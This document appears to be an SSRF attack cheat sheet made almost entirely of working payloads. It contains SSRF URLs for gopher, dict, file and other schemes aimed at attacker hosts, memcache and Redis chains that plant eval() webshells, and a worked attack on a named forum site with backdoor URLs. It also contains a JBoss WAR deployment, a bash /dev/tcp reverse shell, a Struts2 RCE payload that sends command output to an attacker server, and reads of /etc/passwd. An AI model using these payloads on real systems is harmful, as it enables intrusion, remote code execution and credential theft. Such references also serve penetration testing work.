# SSRF---Server-side-request-forgery
Cheat sheet

###########################################
SSRF PHP function

file_get_contents()
fsockopen()
curl_exec()

###########################################
URL schema support

SFTP:

http://example.com/ssrf.php?url=sftp://evil.com:11111/

evil.com:$ nc -v -l 11111
Connection from [192.168.0.10] port 11111 [tcp/*] accepted (family 2, sport 36136)
SSH-2.0-libssh2_1.4.2

Dict:

http://example.com/ssrf.php?dict://attacker:11111/

evil.com:$ nc -v -l 11111
Connection from [192.168.0.10] port 11111 [tcp/*] accepted (family 2, sport 36136)
CLIENT libcurl 7.40.0

gopher:

// http://example.com/ssrf.php?url=http://evil.com/gopher.php
<?php
        header('Location: gopher://evil.com:12346/_HI%0AMultiline%0Atest');
?>

evil.com:# nc -v -l 12346
Listening on [0.0.0.0] (family 0, port 12346)
Connection from [192.168.0.10] port 12346 [tcp/*] accepted (family 2, sport 49398)
HI
Multiline
test

TFTP:

http://example.com/ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET

evil.com:# nc -v -u -l 12346
Listening on [0.0.0.0] (family 0, port 12346)
TESTUDPPACKEToctettsize0blksize512timeout6

file:

http://example.com/redirect.php?url=file:///etc/passwd

ldap:

http://example.com/redirect.php?url=ldap://localhost:11211/%0astats%0aquit

###########################################
PHP-FPM
PHP-FPM universal SSRF bypass safe_mode/disabled_functions/o exploit

###########################################
SSRF memcache Getshell

Generate serialize:

<?php
    $code=array('global_start'=>'@eval($_REQUEST[\'eval\']);');
    echo serialize($code)."\n".strlen(serialize($code));
    
Output:

a:1:{s:12:"global_start";s:25:"@eval($_REQUEST['eval']);";} //datos serializados
59  // longitud del string

webshell.php:

<?php
//Gopher puede ser reemplazado por otros métodos como arriba
    header('Location: gopher://[target ip]:11211/_%0d%0aset ssrftest 1 0 147%0d%0aa:2:{s:6:"output";a:1:{s:4:"preg";a:2:{s:6:"search";s:5:"/.*/e";s:7:"replace";s:33:"eval(base64_decode($_POST[ccc]));";}}s:13:"rewritestatus";i:1;}%0d%0a');
?>

back.php:

<?php
    header('Location: gopher://192.168.10.12:11211/_%0d%0adelete ssrftest%0d%0a');
?>

example:

open the website

http://bbs.biligame.com/forum.php?mod=ajax&action=downremoteimg&message=[img]http://myvps/webshell.php?logo.jpg[/img]
http://bbs.biligame.com/forum.php?mod=ajax&inajax=yes&action=getthreadtypes

clear data

http://bbs.biligame.com/forum.php?mod=ajax&action=downremoteimg&message=[img]http://myserver/back.php?logo.jpg[/img]

backdoor url

http://bbs.biligame.com/data/cache/hello.php

###########################################
SSRF Redis Getshell

Generate serialize:

<?php
    $a['output']['preg']['search']['plugins'] = '/.*/e';
    $a['output']['preg']['replace']['plugins'] = '@eval($_POST['c']);';
    $a['rewritestatus']=1;
    $setting = serialize($a);
    echo $setting."\n".strlen($setting);
?>

Output:

a:2:{s:6:"output";a:1:{s:4:"preg";a:2:{s:6:"search";a:1:{s:7:"plugins";s:5:"/.*/e";}s:7:"replace";a:1:{s:7:"plugins";s:19:"@eval($_POST["c"]);";}}}s:13:"rewritestatus";i:1;}     //序列化数据
173     //字符串长度

example:

Open website

http://192.168.80.116/forum.php?mod=ajax&action=downremoteimg&message=[img=1,1]http://you-vps-ip/ssrf.php?.jpg[/img]&formhash=818c8f44

Backdoor website

http://192.168.80.116/forum.php?mod=ajax&inajax=yes&action=getthreadtypes

###########################################
FFmpeg

cat test.jpg

#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:http://example.org/header.m3u8|file:///etc/passwd
#EXT-X-ENDLIST

subfile:

#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:http://localhost/header.m3u8|subfile,,start,0,end,64,,:///etc/passwdconcat:http://localhost/header.m3u8|subfile,,start,64,end,128,,:///etc/passwdconcat:http://localhost/header.m3u8|subfile,,start,128,end,256,,:///etc/passwdconcat:http://localhost/header.m3u8|subfile,,start,256,end,512,,:///etc/passwd
#EXT-X-ENDLIST

###########################################
PostgreSQL

Exploit:

> SELECT dblink_send_query('host=127.0.0.1 dbname=quit user=\'\nstats\n\​' password=1 port=11211 sslmode=disable','select
version();');

###########################################
MongoDB

Exploit:

> db.copyDatabase("\1\2\3\4\5\6\7",'test','localhost:8000')
> nc -l 8000 | hexdump -C
> db.copyDatabase(“\nstats\nquit”,’test’,’localhost:11211’)

###########################################
CouchDB

exploit:

http://localhost:5984/_users/_all_docs
HTTP/1.1 200 OK
Server: CouchDB/1.2.0 (Erlang OTP/R15B01)
ETag: "BD1WV12007V05JTG4X6YHIHCA"
Date: Tue, 18 Dec 2012 21:39:59 GMT
Content-Type: text/plain; charset=utf-8
Cache-Control: must-revalidate

{"total_rows":1,"offset":0,"rows":[
{"id":"_design/_auth","key":"_design/_auth","value":{"rev":"1-a8cfb993654bcc635f126724d39eb930"}}
]}

Attacker could also send requests from CouchDB server to intranet by using replication function

POST http://couchdb:5984/_replicate
Content-Type: application/json
Accept: application/json

{
    "source" : "recipes",
    "target" : "http://ssrf-me:11211/recipes",
}

###########################################
Jboss

Jbosss POC:

/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service=MainDeployer&methodIndex=17&arg0=http://our_public_internet_server/utils/cmd.war

Shell:

http://target.com/ueditor/jsp/getRemoteImage.jsp
POST:
    upfile=http://10.0.0.1:8080/jmx-console/HtmlAdaptor?action=invokeOp%26name=jboss.system%3Aservice%3DMainDeployer%26methodIndex=3%26arg0=http%3A%2F%2F远端地址%2Fhtml5.war%23.jpg
http://target.com/ueditor/jsp/getRemoteImage.jsp
POST:
    upfile=http://内网IP:8080/html5/023.jsp%23.jpg

Reverse shell:

bash -i >& /dev/tcp/123.45.67.89/9999 0>&1

###########################################
Weblogic

gopher.php:

<?php
	header("Location:gopher://vps-ip:2333/_test");
?>

vuln website:

https://example.com/uddiexplorer/SearchPublicRegistries.jsp
POST:
    operator=http://vps-ip/gopher.php&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search

vps:

> nc -lvv 2333

Connection from xx.xx.xx.xx port 2333 [tcp/snapp] accepted

###########################################
Local File Read

http://www.xxx.com/redirect.php?url=file:///etc/passwd
http://www.xxx.com/redirect.php?url=file:///C:/Windows/win.ini

###########################################
Bool SSRF

Struts2-016 POC:

?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'command'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23t%3d%23d.readLine(),%23u%3d"http://SERVER/result%3d".concat(%23t),%23http%3dnew%20java.net.URL(%23u).openConnection(),%23http.setRequestMethod("GET"),%23http.connect(),%23http.getInputStream()}

//Modificar el SERVIDOR para que el vps devuelva los resultados en la vista access.log

###########################################
SSRF Proxy

SSRF_Proxy:
https://github.com/bcoles/ssrf_proxy

ssrfsocks:
https://github.com/iamultra/ssrfsocks
